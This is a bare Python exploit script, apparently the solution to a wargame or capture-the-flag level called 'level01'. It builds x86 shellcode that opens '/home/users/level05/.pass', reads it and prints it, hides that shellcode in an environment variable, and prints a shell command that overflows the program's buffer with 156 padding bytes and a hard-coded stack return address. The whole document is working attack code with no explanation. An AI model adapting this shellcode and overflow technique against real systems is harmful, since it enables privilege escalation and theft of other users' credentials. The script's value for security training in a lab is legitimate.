#!/usr/bin/env python3

import struct

def p(x): return struct.pack('<I', x)
def printable(x): return (x >= 0x20 and x <= 0x7e)

shellcode = b''
shellcode += b'\x90' * 101
shellcode += b'\xeb\x4a\x5b\x89\xdd\x83\xc5\x19\x31\xc0\x4d\x88\x45\x01\x45\x31\xc0\x40\x40\x40\x40\x40\x31\xc9\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x40\x40\x40\x31\xdb\x89\xe9\x31\xd2\x42\xcd\x80\x31\xc0\x40\x40\x40\x89\xfb\x89\xe9\x31\xd2\x42\xcd\x80\x31\xc0\x40\x40\x40\x40\x31\xdb\x43\x89\xe9\x31\xd2\x42\xcd\x80\xeb\xd2\xe8\xb1\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\xff'

should_be = 156
payload = b''
# payload += shellcode
payload += b'A' * (should_be - len(payload))
payload += p(0xffffde5a)

print("export OUIOUI=$'", end='')
for s in shellcode:
    print("\\x%02x" % s, end='')
print("'")

print("./level01 <<< $'", end='')
for i, p in enumerate(payload):
    if printable(p) and i < len(payload) - 4:
        print(chr(p), end='')
    else:
        print("\\x%02x" % p, end="")
print("'")
